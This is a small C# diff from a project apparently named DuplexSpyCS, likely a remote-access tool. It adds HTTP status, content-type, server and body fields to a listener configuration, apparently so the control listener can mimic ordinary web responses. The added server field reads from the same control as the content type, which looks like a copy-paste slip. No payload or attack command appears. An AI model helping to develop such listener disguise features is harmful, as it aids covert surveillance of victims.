@@ -85,6 +85,11 @@ namespace DuplexSpyCS
                 httpMethod = (enHttpMethod)Enum.Parse(typeof(enHttpMethod), comboBox4.Text),
                 szHttpPath = textBox5.Text,
                 szHttpUA = textBox6.Text,
+
+                szStatus = comboBox2.Text,
+                szContentType = comboBox3.Text,
+                szServer = comboBox3.Text,
+                szBody = textBox8.Text,
             };
 
             if (!m_sqlConn.fnbSaveListener(config))
